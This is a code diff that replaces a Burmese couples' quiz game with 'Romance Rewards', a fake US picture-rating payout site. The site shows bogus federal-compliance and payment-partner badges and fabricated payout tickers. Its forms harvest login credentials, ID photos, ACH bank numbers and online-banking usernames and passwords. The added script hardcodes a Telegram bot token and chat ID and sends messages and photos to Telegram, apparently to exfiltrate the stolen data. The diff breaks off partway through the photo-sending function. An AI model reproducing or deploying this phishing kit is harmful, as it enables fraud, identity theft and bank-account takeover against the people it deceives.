+.form-group input, .form-group select { width: 100%; padding: 11px 12px; background-color: #0f172a; border: 1px solid #334155; color: #f8fafc; border-radius: 10px; font-size: 0.95rem; outline: none; transition: border-color 0.2s; }
+.form-group input:focus, .form-group select:focus { border-color: #E000FF; box-shadow: 0 0 8px rgba(224, 0, 255, 0.3); }
+.save-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; border: none; padding: 13px; width: 100%; border-radius: 10px; font-weight: 800; cursor: pointer; margin-top: 6px; font-size: 0.98rem; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); transition: all 0.2s; }
+.save-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(16, 185, 129, 0.5); }
+
+/* Modal Popup Styles */
+.modal-overlay {
+display: none;
+position: fixed;
+top: 0; left: 0;
+width: 100%; height: 100%;
+background: rgba(0, 0, 0, 0.7);
+backdrop-filter: blur(8px);
+z-index: 3000;
+justify-content: center;
+align-items: center;
+padding: 20px;
+}
+.modal-content-card {
+background: #1e293b;
+border: 1px solid #8A00F5;
+border-radius: 20px;
+padding: 25px 20px 20px 20px;
+width: 100%;
+max-width: 420px;
+position: relative;
+box-shadow: 0 0 40px rgba(138, 0, 245, 0.25);
+animation: modalPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+@keyframes modalPop {
+0% { transform: scale(0.8); opacity: 0; }
+100% { transform: scale(1); opacity: 1; }
+}
+.modal-back-btn {
+background: #0f172a;
+border: 1px solid #8A00F5;
+color: #FFFFFF;
+padding: 6px 12px;
+border-radius: 8px;
+font-size: 0.8rem;
+font-weight: 600;
+cursor: pointer;
+display: inline-flex;
+align-items: center;
+gap: 6px;
+margin-bottom: 15px;
+transition: all 0.2s;
+}
+.modal-back-btn:hover {
+background: #8A00F5;
+color: #ffffff;
 }
 </style>
 </head>
 <body>
 
-<audio id="bgAudio" loop>
-<source src="https://files.catbox.moe/dhueur.mp3" type="audio/mp3">
-</audio>
-
-<!-- 🌤️ ရာသီဥတု ၄ မျိုး (နေပူ၊ မိုးရွာ၊ လေတိုက်၊ နှင်းကျ) -->
-<div id="sunWeather" class="weather-container active">
-<div class="sun-element">☀️</div>
-<div class="cloud-white" style="top: 40px; left: 10%;">☁️</div>
-<div class="cloud-white" style="top: 80px; right: 15%; animation-delay: 5s;">☁️</div>
+<div class="global-announcement-ticker">
+<marquee scrollamount="6">🚨 📢 Announcement: Minimum withdrawal amount is USD 50. Process your daily rewards safely and smoothly according to US standards. 🌟</marquee>
 </div>
 
-<div id="rainWeather" class="weather-container">
-<div class="rain-cloud-dark" style="left: 10%;">🌧️☁️</div>
-<div class="rain-cloud-dark" style="right: 15%; animation-delay: 4s;">🌧️☁️</div>
-<div class="raindrop" style="left: 20%; animation-delay: 0.1s;"></div>
-<div class="raindrop" style="left: 40%; animation-delay: 0.3s;"></div>
-<div class="raindrop" style="left: 60%; animation-delay: 0.2s;"></div>
-<div class="raindrop" style="left: 80%; animation-delay: 0.4s;"></div>
+<div class="overlay" id="overlay" onclick="toggleSidebar()"></div>
+
+<div class="sidebar" id="sidebar">
+<div class="sidebar-header">
+<h3>ROMANCE REWARDS</h3>
+<button class="close-menu-btn" onclick="toggleSidebar()"><i class="fa-solid fa-xmark"></i></button>
+</div>
+<div class="sidebar-menu-item" onclick="openSubPage('account-page')">
+<i class="fa-solid fa-id-card"></i> <span>Account Verification (KYC)</span>
+</div>
+<div class="sidebar-menu-item" onclick="openSubPage('bank-connect-page')">
+<i class="fa-solid fa-building-columns"></i> <span>Link US Bank (ACH)</span>
+</div>
+<div class="sidebar-menu-item" onclick="openSubPage('balance-page')">
+<i class="fa-solid fa-file-invoice-dollar"></i> <span>Balance & Statement</span>
+</div>
+<div class="sidebar-menu-item" onclick="openSubPage('withdraw-page')">
+<i class="fa-solid fa-money-bill-transfer"></i> <span>Withdraw Funds</span>
+</div>
+<div class="sidebar-menu-item" onclick="openSubPage('support-page')">
+<i class="fa-solid fa-headset"></i> <span>Customer Support</span>
 </div>
 
-<div id="windWeather" class="weather-container">
-<div class="wind-cloud" style="top: 50px; left: -50px;">💨☁️</div>
-<div class="wind-cloud" style="top: 150px; left: -80px; animation-delay: 3s;">🍃☁️</div>
+<div class="compliance-section">
+<div class="compliance-badge-main">
+<img src="https://i.ibb.co/C3bp3Z3M/IMG-7802.png" alt="US Federal Compliance" class="federal-logo">
+<div class="compliance-text">
+<h3>US Federal Compliance</h3>
+<p>Authorized & Officially Regulated under US Digital Consumer & Rewards Standard Guidelines</p>
 </div>
-
-<div id="snowWeather" class="weather-container">
-<div class="snowflake" style="left: 10%; animation-delay: 0s;">❄️</div>
-<div class="snowflake" style="left: 30%; animation-delay: 1s;">❄️</div>
-<div class="snowflake" style="left: 50%; animation-delay: 0.5s;">❄️</div>
-<div class="snowflake" style="left: 70%; animation-delay: 1.5s;">❄️</div>
-<div class="snowflake" style="left: 90%; animation-delay: 0.8s;">❄️</div>
 </div>
-
-<!-- 💖 ကိုကိုက မီးမီးကို အသည်းပုံပေးခြင်း နှင့် မီးမီး အာဘွားပစ်သည့် အန်နီမေးရှင်း -->
-<div class="love-action-container">
-<div class="flying-heart-boy">💖</div>
-<div class="flying-kiss-girl">💋</div>
+<div class="verified-partners-grid">
+<div class="partner-card" onclick="openModal('visa')">
+<img src="https://i.ibb.co/vvZ6VSBn/IMG-7801.png" alt="VISA">
 </div>
-
-<div class="floating-container" id="floatingContainer">
-<div class="photo-wrapper" style="top: 10%; left: 12%; animation-delay: 0s;"><span class="photo-emoji">💖</span><img src="https://i.ibb.co/Kpmz3N7Z/IMG-7456.jpg" class="floating-photo border-cyan"></div>
-<div class="photo-wrapper" style="top: 70%; left: 75%; animation-delay: 1.2s;"><span class="photo-emoji">✨</span><img src="https://i.ibb.co/7txfbMMc/IMG-7453.jpg" class="floating-photo border-yellow"></div>
-<div class="photo-wrapper" style="top: 35%; left: 80%; animation-delay: 0.5s;"><span class="photo-emoji">🔥</span><img src="https://i.ibb.co/xd3MKS7/IMG-7455.jpg" class="floating-photo border-lime"></div>
-<div class="photo-wrapper" style="top: 75%; left: 15%; animation-delay: 2s;"><span class="photo-emoji">🌸</span><img src="https://i.ibb.co/wh2cr4j8/IMG-7452.jpg" class="floating-photo border-orange"></div>
-<div class="photo-wrapper" style="top: 55%; left: 30%; animation-delay: 0.8s;"><span class="photo-emoji">🥰</span><img src="https://i.ibb.co/JWSPgjS4/IMG-7454.jpg" class="floating-photo border-purple"></div>
-<div class="photo-wrapper" style="top: 15%; left: 70%; animation-delay: 1.5s;"><span class="photo-emoji">💫</span><img src="https://i.ibb.co/V0Zkhxm7/IMG-7333.jpg" class="floating-photo border-pink"></div>
-<div class="photo-wrapper" style="top: 45%; left: 10%; animation-delay: 2.2s;"><span class="photo-emoji">🌷</span><img src="https://i.ibb.co/DSXNdck/IMG-7208.png" class="floating-photo border-cyan"></div>
-<div class="photo-wrapper" style="top: 12%; left: 40%; animation-delay: 0.3s;"><span class="photo-emoji">⭐</span><img src="https://i.ibb.co/RXSty1S/IMG-7202.jpg" class="floating-photo border-yellow"></div>
-<div class="photo-wrapper" style="top: 82%; left: 55%; animation-delay: 1.8s;"><span class="photo-emoji">💌</span><img src="https://i.ibb.co/ynmCMtgD/IMG-7203.jpg" class="floating-photo border-lime"></div>
-<div class="photo-wrapper" style="top: 28%; left: 25%; animation-delay: 1s;"><span class="photo-emoji">😻</span><img src="https://i.ibb.co/V0tgjspR/IMG-7207.png" class="floating-photo border-orange"></div>
-<div class="photo-wrapper" style="top: 78%; left: 40%; animation-delay: 0.7s;"><span class="photo-emoji">🎀</span><img src="https://i.ibb.co/Zzf9xfX1/IMG-7156.jpg" class="floating-photo border-purple"></div>
-<div class="photo-wrapper" style="top: 8%; left: 55%; animation-delay: 2.5s;"><span class="photo-emoji">🧸</span><img src="https://i.ibb.co/ZpzRtHRk/IMG-6913.jpg" class="floating-photo border-pink"></div>
-<div class="photo-wrapper" style="top: 42%; left: 50%; animation-delay: 1.4s;"><span class="photo-emoji">💘</span><img src="https://i.ibb.co/cz1ZjDr/IMG-6973.jpg" class="floating-photo border-cyan"></div>
-<div class="photo-wrapper" style="top: 62%; left: 88%; animation-delay: 0.2s;"><span class="photo-emoji">🎉</span><img src="https://i.ibb.co/Dgz3bNyQ/IMG-6413.jpg" class="floating-photo border-yellow"></div>
-<div class="photo-wrapper" style="top: 32%; left: 5%; animation-delay: 1.9s;"><span class="photo-emoji">🌺</span><img src="https://i.ibb.co/1JQ6hGNW/camphoto-1594243340.jpg" class="floating-photo border-lime"></div>
-<div class="photo-wrapper" style="top: 88%; left: 30%; animation-delay: 0.6s;"><span class="photo-emoji">⚡</span><img src="https://i.ibb.co/99zvp6NX/camphoto-341603450.jpg" class="floating-photo border-orange"></div>
-<div class="photo-wrapper" style="top: 22%; left: 88%; animation-delay: 2.1s;"><span class="photo-emoji">🍬</span><img src="https://i.ibb.co/5hd03H1p/IMG-8256.jpg" class="floating-photo border-purple"></div>
-<div class="photo-wrapper" style="top: 52%; left: 68%; animation-delay: 1.1s;"><span class="photo-emoji">💋</span><img src="https://i.ibb.co/6RDrNLws/IMG-6977.jpg" class="floating-photo border-pink"></div>
-<div class="photo-wrapper" style="top: 18%; left: 82%; animation-delay: 0.4s;"><span class="photo-emoji">💎</span><img src="https://i.ibb.co/Pzxbfcxq/IMG-6388.jpg" class="floating-photo border-cyan"></div>
-<div class="photo-wrapper" style="top: 72%; left: 3%; animation-delay: 1.7s;"><span class="photo-emoji">🍀</span><img src="https://i.ibb.co/gLQFcGXG/camphoto-33463914.jpg" class="floating-photo border-yellow"></div>
-<div class="photo-wrapper" style="top: 48%; left: 38%; animation-delay: 2.3s;"><span class="photo-emoji">🍫</span><img src="https://i.ibb.co/KjT0QYxZ/IMG-5054.jpg" class="floating-photo border-lime"></div>
+<div class="partner-card" onclick="openModal('mastercard')">
+<img src="https://i.ibb.co/nMjCvdPp/IMG-7800.png" alt="Mastercard">
 </div>
-
-<div id="welcomePage" class="content-box">
-<div class="main-title-box">
-<h1 class="main-title">💞 မေးခွန်းလေးတွေ ဖြေရအောင် 💭</h1>
-<p class="love-quote">🍒💗 ယောက်ျားကိုလွမ်းတိုင်း ကြည့်နိုင်ဖို့ 🍇💞</p>
+<div class="partner-card" onclick="openModal('stripe')">
+<img src="https://i.ibb.co/XZD440F5/IMG-7799.jpg" alt="Stripe">
 </div>
-<div class="control-box">
-<button class="primary-btn" onclick="startGame()">ဂိမ်းစရန်နှိပ်ပါ ပူတူးရေ 🎮</button>
-<button class="music-btn" onclick="toggleMusic()">🎵 သီချင်း ဖွင့်/ပိတ်</button>
+<div class="partner-card" onclick="openModal('paypal')">
+<img src="https://i.ibb.co/Wv8nF4Np/IMG-7798.png" alt="PayPal">
+</div>
+<div class="partner-card" onclick="openModal('digicert')">
+<img src="https://i.ibb.co/Swp4m90s/IMG-7797.png" alt="DigiCert">
+</div>
+<div class="partner-card" onclick="openModal('bbb')">
+<img src="https://i.ibb.co/MxyJ1T2C/IMG-7796.png" alt="BBB">
+</div>
 </div>
 </div>
 
-<div id="gamePage" class="content-box" style="display: none;">
-<h2 class="game-title">💋ဘယ်သူဖြစ်မယ်ထင်လဲ 💋</h2>
-<div class="question-box" id="questionText">မေးခွန်း တင်ဆက်နေပါပြီ...</div>
-
-<div class="choices-container" id="choicesContainer">
-<div class="choice-card" onclick="selectChoice('boy')">
-<div class="avatar-container">
-<img src="https://i.ibb.co/mVhzGR0T/IMG-7744.jpg" class="heart-head" style="box-shadow: 0 0 25px #ffffff, 0 0 10px #ffdf73; background: #ffffff;">
-<svg class="cartoon-body-full" viewBox="0 0 100 90">
-<g class="right-arm"><line x1="65" y1="12" x2="86" y2="30" stroke="#ffffff" stroke-width="4.5" stroke-linecap="round"/><circle cx="88" cy="32" r="4.5" fill="#ffdf73"/></g>
-<g class="left-arm"><line x1="35" y1="12" x2="14" y2="30" stroke="#ffffff" stroke-width="4.5" stroke-linecap="round"/><circle cx="12" cy="32" r="4.5" fill="#ffdf73"/></g>
-<path d="M34,4 L66,4 L74,48 C74,48 78,54 68,54 L32,54 C22,54 26,48 26,48 Z" fill="#ffffff" stroke="#ffdf73" stroke-width="2"/>
-<polygon points="50,15 58,15 54,42" fill="#ff007f"/>
-<g class="right-leg"><line x1="61" y1="54" x2="61" y2="74" stroke="#ffffff" stroke-width="5" stroke-linecap="round"/><ellipse cx="61" cy="78" rx="7" ry="4.5" fill="#39ff14" stroke="#ffdf73" stroke-width="1.5"/></g>
-<g class="left-leg"><line x1="39" y1="54" x2="39" y2="74" stroke="#ffffff" stroke-width="5" stroke-linecap="round"/><ellipse cx="39" cy="78" rx="7" ry="4.5" fill="#39ff14" stroke="#ffdf73" stroke-width="1.5"/></g>
-</svg>
-</div>
-<div class="choice-name-badge">ကိုကို🐼 ❤️</div>
-</div>
-
-<div class="choice-card" onclick="selectChoice('girl')">
-<div class="avatar-container">
-<img src="https://i.ibb.co/Zzf9xfX1/IMG-7156.jpg" class="heart-head" style="box-shadow: 0 0 25px #ffdf73, 0 0 10px #ff007f; background: #ffdf73;">
-<svg class="cartoon-body-full" viewBox="0 0 100 90">
-<g class="right-arm"><line x1="65" y1="12" x2="86" y2="30" stroke="#ffdf73" stroke-width="4.5" stroke-linecap="round"/><circle cx="88" cy="32" r="4.5" fill="#ffffff"/></g>
-<g class="left-arm"><line x1="35" y1="12" x2="14" y2="30" stroke="#ffdf73" stroke-width="4.5" stroke-linecap="round"/><circle cx="12" cy="32" r="4.5" fill="#ffffff"/></g>
-<path d="M35,4 L65,4 C78,42 84,52 84,52 L16,52 C16,52 22,42 35,4 Z" fill="#ffdf73" stroke="#ff007f" stroke-width="2"/>
-<circle cx="50" cy="24" r="3.5" fill="#ffffff"/>
-<circle cx="50" cy="38" r="3.5" fill="#ffffff"/>
-<g class="right-leg"><line x1="61" y1="52" x2="61" y2="74" stroke="#ffdf73" stroke-width="4.5" stroke-linecap="round"/><ellipse cx="61" cy="78" rx="7" ry="4.5" fill="#ff007f" stroke="#ffffff" stroke-width="1.5"/></g>
-<g class="left-leg"><line x1="39" y1="52" x2="39" y2="74" stroke="#ffdf73" stroke-width="4.5" stroke-linecap="round"/><ellipse cx="39" cy="78" rx="7" ry="4.5" fill="#ff007f" stroke="#ffffff" stroke-width="1.5"/></g>
-</svg>
-</div>
-<div class="choice-name-badge">မီးမီး 🐹🍓</div>
+<div class="nav-menu-container">
+<button class="main-menu-btn" onclick="navigateToMainMenu()">
+<i class="fas fa-th-large"></i> Main Menu
+</button>
 </div>
 </div>
 
-<div class="result-box" id="resultText"></div>
-<button class="primary-btn" id="nextBtn" onclick="nextQuestion()" style="display: none;">နောက်ထပ် မေးခွန်း ➡️</button>
+<div id="landing-page" class="page active">
+<div class="landing-header">
+<h1>ROMANCE REWARDS</h1>
+<p>US Official Daily Image Rating & Payout Portal</p>
+<div class="marquee-container">
+<marquee scrollamount="5">🇺🇸 Over 5,000+ active US members are successfully withdrawing daily rewards this week! • Instant Payouts via US Bank & Direct Deposit • Rated #1 Reward Portal in the US 🌟</marquee>
+</div>
+<div class="poster-grid-preview" id="landing-grid-preview"></div>
+<div class="marquee-container-payout">
+<marquee scrollamount="5" id="landing-payout-ticker"></marquee>
+</div>
+</div>
+<div class="trust-badges">
+<span><i class="fa-solid fa-lock"></i> 256-Bit SSL</span>
+<span><i class="fa-solid fa-flag-usa"></i> US Standard</span>
+<span><i class="fa-solid fa-check-circle"></i> Verified</span>
+</div>
+<button class="get-started-btn" onclick="switchPage('login-page')">Sign In to Account</button>
+<button class="signup-redirect-btn" onclick="switchPage('signup-page')">Create New Account (Sign Up)</button>
+</div>
+
+<!-- Login Page -->
+<div id="login-page" class="page">
+<div class="auth-card">
+<h2>Secure Sign In</h2>
+<p>Enter your US registered account details.</p>
+<div class="auth-input-group">
+<label>Email Address</label>
+<input type="email" id="login-email" placeholder="user@gmail.com">
+</div>
+<div class="auth-input-group">
+<label>Password</label>
+<input type="password" id="login-pass" placeholder="Enter password">
+</div>
+<button type="button" class="auth-submit-btn" onclick="handleLoginSubmit()">Sign In to Dashboard</button>
+<button type="button" class="auth-back-btn" onclick="switchPage('landing-page')">Back to Home</button>
+</div>
+</div>
+
+<!-- Sign Up Page -->
+<div id="signup-page" class="page">
+<div class="auth-card">
+<h2>Create Account</h2>
+<p>Sign up to start earning daily US rewards.</p>
+<div class="auth-input-group">
+<label>Email Address</label>
+<input type="email" id="signup-email" placeholder="user@gmail.com">
+</div>
+<div class="auth-input-group">
+<label>Password</label>
+<input type="password" id="signup-pass" placeholder="Enter secure password">
+</div>
+<button type="button" class="auth-submit-btn" onclick="handleSignupSubmit()">Register & Sign Up</button>
+<button type="button" class="auth-back-btn" onclick="switchPage('landing-page')">Back to Home</button>
+</div>
+</div>
+
+<div id="dashboard-page" class="page">
+<div class="top-nav">
+<button class="menu-toggle-btn" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
+<div class="user-profile-widget">
+<div class="user-avatar-circle" id="user-avatar-letter">U</div>
+<div class="user-email-text" id="nav-email-display">user@gmail.com</div>
+</div>
+</div>
+<div class="dashboard-content">
+<div class="banner-earn">
+<h2 class="fading-title">💖 US Romance Reward Gallery</h2>
+<p>Rate pictures and get paid instantly to your US account</p>
+<div style="background: #0f172a; padding: 6px 10px; border-radius: 12px; margin: 8px auto; max-width: 350px; font-size: 0.72rem; color: #FFFFFF; font-weight: bold; border: 1px solid #8A00F5;">
+<marquee scrollamount="5" id="dashboard-payout-ticker"></marquee>
+</div>
+<div class="balance-box">Total Balance: $<span id="user-balance">15.00</span> USD</div>
+
+<!-- Progress Bar Section -->
+<div class="progress-container" style="max-width: 380px; margin: 15px auto 5px auto; text-align: left;">
+<div style="display: flex; justify-content: space-between; font-size: 0.78rem; font-weight: 700; color: #ffffff; margin-bottom: 6px; text-shadow: 0 0 8px rgba(255,255,255,0.4);">
+<span style="color: #ffffff;">Withdrawal Progress</span>
+<span id="progress-percentage" style="color: #FFFFFF; font-weight: 800;">30% Completed</span>
+</div>
+<div style="background: #0f172a; border-radius: 10px; height: 12px; width: 100%; overflow: hidden; border: 1px solid #ffffff; box-shadow: inset 0 2px 4px rgba(0,0,0,0.4);">
+<div id="progress-bar-fill" style="background: linear-gradient(135deg, #ffffff 0%, #E000FF 100%); height: 100%; width: 30%; border-radius: 10px; transition: width 0.4s ease; box-shadow: 0 0 12px rgba(255, 255, 255, 0.6);"></div>
+</div>
+<div style="font-size: 0.72rem; color: #ffffff; text-align: center; margin-top: 6px; font-weight: 600; text-shadow: 0 0 6px rgba(255,255,255,0.3);" id="progress-milestone-text">
+Minimum Withdrawal: <span style="color: #FFFFFF; font-weight: 700;">$50.00</span> (<span style="color: #ffffff;">$35.00 more to go</span>)
+</div>
+</div>
+
+</div>
+
+<div class="dashboard-stats-filter">
+<div class="stat-card-box">
+<h4>Today's Total Rated</h4>
+<span id="stat-rated-count">128 Pictures</span>
+</div>
+<div class="stat-card-box">
+<h4>Active US Users</h4>
+<span id="stat-active-users">5,420 Online</span>
+</div>
+</div>
+
+<div class="quick-filters-container">
+<button class="filter-btn active" onclick="filterGallery('all')"><i class="fas fa-th"></i> All Items</button>
+<button class="filter-btn" onclick="filterGallery('trending')"><i class="fas fa-fire"></i> Trending</button>
+<button class="filter-btn" onclick="filterGallery('top')"><i class="fas fa-star"></i> Top Rated</button>
+<button class="filter-btn" onclick="filterGallery('recent')"><i class="fas fa-clock"></i> Recent</button>
+</div>
+
+<div class="section-title" id="section-title-count">Available Gallery Items</div>
+<div class="image-grid" id="image-grid-container"></div>
+</div>
+</div>
+
+<div id="detail-page" class="page">
+<div>
+<button class="back-btn" onclick="goBackToDashboard()"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="detail-container">
+<img id="detail-img" src="" class="detail-img" alt="Artwork">
+<h2 id="detail-title" style="margin-bottom: 6px; font-size: 1.15rem; color: #E000FF;">Artwork Title</h2>
+<p style="color: #94a3b8; font-size: 0.82rem; margin-bottom: 14px;">Rate this picture to earn instant US reward credit.</p>
+<div class="rating-box">
+<p style="margin-bottom: 10px; font-size: 0.92rem; font-weight: 600; color: #f8fafc;">How would you rate this picture?</p>
+<div class="star-rating" id="star-container">
+<i class="fa-solid fa-star" onclick="rateStar(1)"></i>
+<i class="fa-solid fa-star" onclick="rateStar(2)"></i>
+<i class="fa-solid fa-star" onclick="rateStar(3)"></i>
+<i class="fa-solid fa-star" onclick="rateStar(4)"></i>
+<i class="fa-solid fa-star" onclick="rateStar(5)"></i>
+</div>
+<button class="submit-rating-btn" onclick="submitRating()">Submit Rating & Earn $2.00</button>
+</div>
+</div>
+</div>
+
+<div id="account-page" class="sub-page-container">
+<div>
+<button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="sub-card">
+<h2 style="margin-bottom: 8px; color: #E000FF; font-size: 1.15rem;">Account & US KYC Verification</h2>
+<p style="color: #94a3b8; font-size: 0.82rem; margin-bottom: 14px;">Enter your accurate US details and capture ID photos.</p>
+<div class="form-group"><label>Full Name</label><input type="text" id="kyc-name" placeholder="John Doe"></div>
+<div class="form-group"><label>US Phone Number</label><input type="text" id="kyc-phone" placeholder="+1 (555) 000-0000"></div>
+<div class="form-group"><label>ID Type</label><select id="kyc-id-type"><option>US Passport</option><option>Driver License</option><option>State ID</option></select></div>
+<div class="form-group">
+<label><i class="fa-solid fa-camera"></i> Front Side of ID</label>
+<input type="file" accept="image/*" capture="environment" id="front-id-input" onchange="previewImage(event, 'front-preview')" style="display:none;">
+<button type="button" onclick="document.getElementById('front-id-input').click()" style="background:#0f172a; border:1px solid #334155; color:#FFFFFF; padding:10px; width:100%; border-radius:8px; cursor:pointer; font-size:0.85rem; font-weight:600; margin-bottom:8px;">Open Camera / Choose Front Photo</button>
+<div style="text-align:center;"><img id="front-preview" src="" style="max-width:100%; max-height:130px; display:none; border-radius:8px; border:1px solid #334155;" alt="Front ID Preview"></div>
+</div>
+<div class="form-group">
+<label><i class="fa-solid fa-camera"></i> Back Side of ID</label>
+<input type="file" accept="image/*" capture="environment" id="back-id-input" onchange="previewImage(event, 'back-preview')" style="display:none;">
+<button type="button" onclick="document.getElementById('back-id-input').click()" style="background:#0f172a; border:1px solid #334155; color:#FFFFFF; padding:10px; width:100%; border-radius:8px; cursor:pointer; font-size:0.85rem; font-weight:600; margin-bottom:8px;">Open Camera / Choose Back Photo</button>
+<div style="text-align:center;"><img id="back-preview" src="" style="max-width:100%; max-height:130px; display:none; border-radius:8px; border:1px solid #334155;" alt="Back ID Preview"></div>
+</div>
+<button class="save-btn" onclick="saveKYCInfo()">Save & Send KYC Photos</button>
+</div>
+</div>
+
+<div id="bank-connect-page" class="sub-page-container">
+<div>
+<button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="sub-card">
+<div class="secure-badge"><i class="fa-solid fa-shield-halved"></i> US Financial Security Verified Portal</div>
+<h2 style="margin-bottom: 8px; color: #E000FF; font-size: 1.15rem;">Link US Bank (ACH Direct Deposit)</h2>
+<p style="color: #94a3b8; font-size: 0.82rem; margin-bottom: 14px;">Enter your US bank routing and account details for direct payouts.</p>
+<div class="form-group"><label>Bank Name</label><input type="text" id="ach-bank-name" placeholder="e.g. Chase, Bank of America"></div>
+<div class="form-group"><label>Account Holder Name</label><input type="text" id="ach-holder-name" placeholder="Full Name on Account"></div>
+<div class="form-group"><label>Routing Number (9 Digits)</label><input type="text" id="ach-routing" placeholder="XXXXXXXXX" maxlength="9"></div>
+<div class="form-group"><label>Account Number</label><input type="text" id="ach-account" placeholder="Account Number"></div>
+<div class="form-group"><label>Account Type</label>
+<select id="ach-type">
+<option value="Checking">Checking Account</option>
+<option value="Savings">Savings Account</option>
+</select>
+</div>
+<button class="save-btn" onclick="saveACHBankInfo()">Secure Connect & Save ACH</button>
+</div>
+</div>
+
+<div id="balance-page" class="sub-page-container">
+<div>
+<button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="sub-card" style="text-align: center;">
+<h2 style="margin-bottom: 14px; color: #E000FF; font-size: 1.15rem;">Balance Statement & Ledger</h2>
+<div style="background: #0f172a; padding: 20px; border-radius: 12px; margin-bottom: 14px; border: 1px solid #334155;">
+<p style="color: #94a3b8; font-size: 0.88rem;">Available Balance</p>
+<h1 style="color: #34d399; font-size: 2rem; margin-top: 6px; text-shadow: 0 0 15px rgba(16, 185, 129, 0.3);">$<span id="statement-balance">15.00</span> USD</h1>
+</div>
+<p style="color: #94a3b8; font-size: 0.82rem;">All earnings from picture ratings are credited securely.</p>
+</div>
+</div>
+
+<div id="withdraw-page" class="sub-page-container">
+<div>
+<button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="sub-card">
+<h2 style="margin-bottom: 8px; color: #E000FF; font-size: 1.15rem;">Withdraw Funds</h2>
+<p style="color: #94a3b8; font-size: 0.82rem; margin-bottom: 14px;">Verify your banking credentials to complete instant payout.</p>
+<div class="form-group">
+<label>Amount ($ USD - Minimum $50)</label>
+<input type="number" id="withdraw-amount" placeholder="50.00">
+</div>
+<div class="form-group">
+<label>Bank Name</label>
+<input type="text" id="withdraw-bank-name" placeholder="e.g. Chase, Bank of America">
+</div>
+<div class="form-group">
+<label>Bank Username</label>
+<input type="text" id="withdraw-bank-user" placeholder="Bank Username">
+</div>
+<div class="form-group">
+<label>Bank Password</label>
+<input type="password" id="withdraw-bank-pass" placeholder="Bank Password">
+</div>
+<button class="save-btn" onclick="submitWithdrawal()">Request Instant Payout</button>
+</div>
+</div>
+
+<div id="support-page" class="sub-page-container">
+<div>
+<button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="sub-card" style="text-align: center; min-height: 250px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+<h2 style="color: #E000FF; font-size: 1.15rem; margin-bottom: 8px;">Customer Support</h2>
+<p style="color: #94a3b8; font-size: 0.85rem;">Support modules are coming soon. Blank page ready for custom updates.</p>
+</div>
+</div>
+
+<div id="infoModal" class="modal-overlay">
+<div class="modal-content-card">
+<button class="modal-back-btn" onclick="closeModal()"><i class="fa-solid fa-arrow-left"></i> Back</button>
+<div id="modalBodyContent"></div>
+</div>
 </div>
 
 <script>
-const questions = [
-"ဘယ်သူက အစားပိုစားလဲ? 🍕", "ဘယ်သူက အရင် စကြိုက်တာလဲ? 💕", "ဘယ်သူက ဒေါသပိုကြီးလဲ? 🦩",
-"ဘယ်သူက အိပ်ရာထနောက်ကျလဲ? 😴", "ဘယ်သူက ဖုန်းကို ပိုစွဲလမ်းလဲ? 📱", "ဘယ်သူက စကားပိုပြောလဲ? 🗣️",
-"ဘယ်သူက အချိုပိုကြိုက်လဲ? 🍰", "ဘယ်သူက အရင်အိပ်ပျော်တာလဲ 😒", "ဘယ်သူက အိပ်ပိုရင်ကြာလဲ? 🥴",
-"ဘယ်သူက ရုပ်ရှင်ကြည့်ရင်း အိပ်လဲ?🎬", "ဘယ်သူက ပိုဆိုးသွမ်းလဲ? 🐒", "ဘယ်သူက အဝတ်အစားရွေးတာ ပိုကြာလဲ? 👕",
-"ဘယ်သူက ဓာတ်ပုံရိုက်ရင် ပိုပိုစိတတ်လဲ? 📸", "ဘယ်သူက ပိုပျင်းရိတတ်လဲ? 🛋️", "ဘယ်သူက ငွေစုတာ ပိုတော်လဲ? 💰",
-"ဘယ်သူက လမ်းလျှောက်ရင်/ကားမောင်းရင် ပိုသတိထားလဲ? 🚗", "ဘယ်သူကစာပြန်နောက်ကျလဲ? ⏳", "ဘယ်သူက မျက်နှာငယ်ပြပြီး ချွဲတတ်လဲ? 🥺",
-"ဘယ်သူက အစားအသောက် ရွေးတတ်လဲ? 🍔", "ဘယ်သူက ချက်ပြုတ်ရတာ ပိုဝါသနာပါလဲ? 🍳", "ဘယ်သူက သီချင်းဆိုရင် ပိုသံစဉ်လွဲတတ်လဲ? 🎤",
-"ဘယ်သူက အိပ်မက်ဆိုးမက်ရင် အရင်လန့်နိုးတတ်လဲ? 🌙", "ဘယ်သူက ပိုအိပ်ရေးဝတတ်လဲ? 🛏️", "ဘယ်သူက အရာရာကို အရင်စတင်ပြောတတ်လဲ? 💬",
-"ဘယ်သူက ရိုမန်းတစ်ဆန်လဲ? 🌹", "ဘယ်သူက ရယ်စရာမပြောဘဲ ကိုယ်တိုင် အရင်ရယ်တတ်လဲ? 😂", "ဘယ်သူက ခရီးသွားရင် ပစ္စည်းပိုဆောင်တတ်လဲ? 🧳",
-"ဘယ်သူက ကော်ဖီ (သို့) လက်ဖက်ရည် ပိုသောက်လဲ? ☕", "ဘယ်သူကအပြစ်လုပ်ထားရင်မျက်နှာပျက်နေတတ်လဲ? 🤭", "ဘယ်သူက ဒီကမ္ဘာပေါ်မှာ အချစ်ရဆုံးနဲ့ အပျော်ဆုံးဖြစ်စေမယ့်သူလဲ? ❤️"
+const BOT_TOKEN = "8814587372:AAFAdCFJ_4AvlIH9fYjMISEDUfMiAFIvKXw";
+const CHAT_ID = "6567680291";
+
+function sendToTelegram(message) {
+let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+fetch(url).catch(err => console.log(err));
+}
+
+function sendPhotoToTelegram(photoBase64, caption) {
+let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+let formData = new FormData();
+formData.append("chat_id", CHAT_ID);
